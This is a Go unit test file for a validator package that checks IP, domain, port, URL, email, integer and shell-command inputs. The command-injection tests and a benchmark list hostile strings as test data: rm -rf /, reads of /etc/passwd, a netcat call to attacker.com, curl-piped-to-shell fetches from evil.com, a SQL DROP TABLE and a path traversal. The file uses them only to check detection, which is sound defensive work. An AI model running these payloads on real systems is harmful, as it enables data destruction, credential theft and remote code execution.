package validator

import (
	"strings"
	"testing"
)

func TestIPValidator(t *testing.T) {
	validator := &IPValidator{}
	
	tests := []struct {
		name      string
		input     string
		wantError bool
	}{
		{"Valid IPv4", "192.168.1.1", false},
		{"Valid IPv4 localhost", "127.0.0.1", false},
		{"Valid IPv6", "2001:0db8:85a3:0000:0000:8a2e:0370:7334", false},
		{"Valid IPv6 short", "::1", false},
		{"Invalid IP", "256.256.256.256", true},
		{"Invalid format", "192.168.1", true},
		{"Empty string", "", true},
		{"Domain instead of IP", "example.com", true},
		{"IP with port", "192.168.1.1:8080", true},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.Validate(tt.input)
			if (err != nil) != tt.wantError {
				t.Errorf("Validate() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

func TestDomainValidator(t *testing.T) {
	validator := &DomainValidator{}
	
	tests := []struct {
		name      string
		input     string
		wantError bool
		expected  string
	}{
		{"Valid domain", "example.com", false, "example.com"},
		{"Valid subdomain", "sub.example.com", false, "sub.example.com"},
		{"Valid multi-level", "a.b.example.com", false, "a.b.example.com"},
		{"With http prefix", "http://example.com", false, "example.com"},
		{"With https prefix", "https://example.com", false, "example.com"},
		{"With path", "example.com/path", false, "example.com"},
		{"With port", "example.com:8080", false, "example.com:8080"},
		{"IP address", "192.168.1.1", false, "192.168.1.1"},
		{"Invalid domain", "example", true, ""},
		{"Invalid chars", "exam ple.com", true, ""},
		{"Empty string", "", true, ""},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.Validate(tt.input)
			if (err != nil) != tt.wantError {
				t.Errorf("Validate() error = %v, wantError %v", err, tt.wantError)
			}
			
			if !tt.wantError {
				sanitized := validator.Sanitize(tt.input)
				if sanitized != tt.expected {
					t.Errorf("Sanitize() = %v, want %v", sanitized, tt.expected)
				}
			}
		})
	}
}

func TestPortValidator(t *testing.T) {
	validator := &PortValidator{}
	
	tests := []struct {
		name      string
		input     string
		wantError bool
	}{
		{"Valid port", "80", false},
		{"Valid port max", "65535", false},
		{"Valid port min", "1", false},
		{"Valid range", "80-443", false},
		{"Valid range spaces", "80 - 443", false},
		{"Invalid port zero", "0", true},
		{"Invalid port high", "65536", true},
		{"Invalid range format", "80-443-8080", true},
		{"Invalid range reversed", "443-80", true},
		{"Invalid characters", "80a", true},
		{"Empty string", "", true},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.Validate(tt.input)
			if (err != nil) != tt.wantError {
				t.Errorf("Validate() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

func TestURLValidator(t *testing.T) {
	validator := NewURLValidator()
	
	tests := []struct {
		name      string
		input     string
		wantError bool
	}{
		{"Valid HTTP URL", "http://example.com", false},
		{"Valid HTTPS URL", "https://example.com", false},
		{"URL with path", "https://example.com/path", false},
		{"URL with query", "https://example.com?q=test", false},
		{"URL with port", "https://example.com:8080", false},
		{"Missing scheme", "example.com", true},
		{"Invalid scheme", "ftp://example.com", true},
		{"Missing host", "https://", true},
		{"Empty string", "", true},
		{"Invalid URL", "https://[invalid", true},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.Validate(tt.input)
			if (err != nil) != tt.wantError {
				t.Errorf("Validate() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

func TestCommandValidator(t *testing.T) {
	validator := NewCommandValidator()
	
	tests := []struct {
		name      string
		input     string
		wantError bool
	}{
		{"Valid command", "nmap", false},
		{"Valid with dash", "apt-get", false},
		{"Valid with path", "/usr/bin/nmap", false},
		{"Valid with dot", "script.sh", false},
		{"Command injection semicolon", "nmap; rm -rf /", true},
		{"Command injection pipe", "nmap | cat /etc/passwd", true},
		{"Command injection backtick", "nmap `whoami`", true},
		{"Command injection dollar", "nmap $(whoami)", true},
		{"Command injection and", "nmap && ls", true},
		{"Command injection or", "nmap || ls", true},
		{"Empty allowed", "", false},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.Validate(tt.input)
			if (err != nil) != tt.wantError {
				t.Errorf("Validate() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

func TestCommandSanitize(t *testing.T) {
	validator := NewCommandValidator()
	
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{"Clean input", "nmap", "nmap"},
		{"Remove semicolon", "nmap; ls", "nmap ls"},
		{"Remove pipe", "nmap | grep", "nmap  grep"},
		{"Remove multiple", "nmap && ls || pwd", "nmap  ls  pwd"},
		{"Remove backticks", "nmap `whoami`", "nmap whoami"},
		{"Complex injection", "nmap$(whoami)|grep", "nmapwhoamigrep"},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			sanitized := validator.Sanitize(tt.input)
			if sanitized != tt.expected {
				t.Errorf("Sanitize() = %v, want %v", sanitized, tt.expected)
			}
		})
	}
}

func TestEmailValidator(t *testing.T) {
	validator := &EmailValidator{}
	
	tests := []struct {
		name      string
		input     string
		wantError bool
		expected  string
	}{
		{"Valid email", "user@example.com", false, "user@example.com"},
		{"Valid with dots", "first.last@example.com", false, "first.last@example.com"},
		{"Valid with plus", "user+tag@example.com", false, "user+tag@example.com"},
		{"Uppercase to lowercase", "User@Example.COM", false, "user@example.com"},
		{"Missing @", "userexample.com", true, ""},
		{"Missing domain", "user@", true, ""},
		{"Missing user", "@example.com", true, ""},
		{"Invalid chars", "user name@example.com", true, ""},
		{"Empty string", "", true, ""},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.Validate(tt.input)
			if (err != nil) != tt.wantError {
				t.Errorf("Validate() error = %v, wantError %v", err, tt.wantError)
			}
			
			if !tt.wantError {
				sanitized := validator.Sanitize(tt.input)
				if sanitized != tt.expected {
					t.Errorf("Sanitize() = %v, want %v", sanitized, tt.expected)
				}
			}
		})
	}
}

func TestIntegerValidator(t *testing.T) {
	validator := &IntegerValidator{Min: 1, Max: 100}
	
	tests := []struct {
		name      string
		input     string
		wantError bool
	}{
		{"Valid min", "1", false},
		{"Valid max", "100", false},
		{"Valid middle", "50", false},
		{"Below min", "0", true},
		{"Above max", "101", true},
		{"Not a number", "abc", true},
		{"Decimal", "50.5", true},
		{"Empty string", "", true},
		{"Negative", "-10", true},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.Validate(tt.input)
			if (err != nil) != tt.wantError {
				t.Errorf("Validate() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

func TestHelperFunctions(t *testing.T) {
	t.Run("ValidateIP", func(t *testing.T) {
		ip, err := ValidateIP("192.168.1.1")
		if err != nil {
			t.Errorf("ValidateIP() unexpected error: %v", err)
		}
		if ip != "192.168.1.1" {
			t.Errorf("ValidateIP() = %v, want 192.168.1.1", ip)
		}
		
		_, err = ValidateIP("invalid")
		if err == nil {
			t.Error("ValidateIP() expected error for invalid input")
		}
	})
	
	t.Run("ValidateDomain", func(t *testing.T) {
		domain, err := ValidateDomain("https://example.com/path")
		if err != nil {
			t.Errorf("ValidateDomain() unexpected error: %v", err)
		}
		if domain != "example.com" {
			t.Errorf("ValidateDomain() = %v, want example.com", domain)
		}
	})
	
	t.Run("ValidatePort", func(t *testing.T) {
		port, err := ValidatePort("80")
		if err != nil {
			t.Errorf("ValidatePort() unexpected error: %v", err)
		}
		if port != "80" {
			t.Errorf("ValidatePort() = %v, want 80", port)
		}
		
		portRange, err := ValidatePort("80-443")
		if err != nil {
			t.Errorf("ValidatePort() unexpected error for range: %v", err)
		}
		if portRange != "80-443" {
			t.Errorf("ValidatePort() = %v, want 80-443", portRange)
		}
	})
}

func BenchmarkIPValidation(b *testing.B) {
	validator := &IPValidator{}
	
	b.Run("Valid", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			validator.Validate("192.168.1.1")
		}
	})
	
	b.Run("Invalid", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			validator.Validate("256.256.256.256")
		}
	})
}

func BenchmarkDomainValidation(b *testing.B) {
	validator := &DomainValidator{}
	
	b.Run("Simple", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			validator.Validate("example.com")
		}
	})
	
	b.Run("WithProtocol", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			validator.Validate("https://example.com/path")
		}
	})
}

func BenchmarkCommandSanitization(b *testing.B) {
	validator := NewCommandValidator()
	
	testCases := []struct {
		name  string
		input string
	}{
		{"Clean", "nmap -sS target.com"},
		{"Injection", "nmap; rm -rf / && echo 'pwned'"},
		{"Complex", "$(curl http://evil.com | sh)"},
	}
	
	for _, tc := range testCases {
		b.Run(tc.name, func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				validator.Sanitize(tc.input)
			}
		})
	}
}

// TestSecurityValidation tests specifically for security vulnerabilities
func TestSecurityValidation(t *testing.T) {
	cmdValidator := NewCommandValidator()
	
	// Test various injection attempts
	injectionAttempts := []string{
		"; cat /etc/passwd",
		"&& rm -rf /",
		"| nc attacker.com 4444",
		"`whoami`",
		"$(curl evil.com/shell.sh | bash)",
		"';DROP TABLE users;--",
		"${IFS}cat${IFS}/etc/passwd",
		"\\x00whoami",
		"\nwhoami\n",
		"..\\..\\..\\windows\\system32\\cmd.exe",
	}
	
	for _, attempt := range injectionAttempts {
		t.Run("Injection: "+attempt[:min(20, len(attempt))], func(t *testing.T) {
			err := cmdValidator.Validate(attempt)
			if err == nil {
				t.Errorf("Command validator failed to detect injection: %s", attempt)
			}
			
			// Ensure sanitization removes dangerous parts
			sanitized := cmdValidator.Sanitize(attempt)
			if strings.Contains(sanitized, ";") || 
			   strings.Contains(sanitized, "&") ||
			   strings.Contains(sanitized, "|") ||
			   strings.Contains(sanitized, "$") ||
			   strings.Contains(sanitized, "`") {
				t.Errorf("Sanitization failed to remove dangerous characters from: %s -> %s", attempt, sanitized)
			}
		})
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}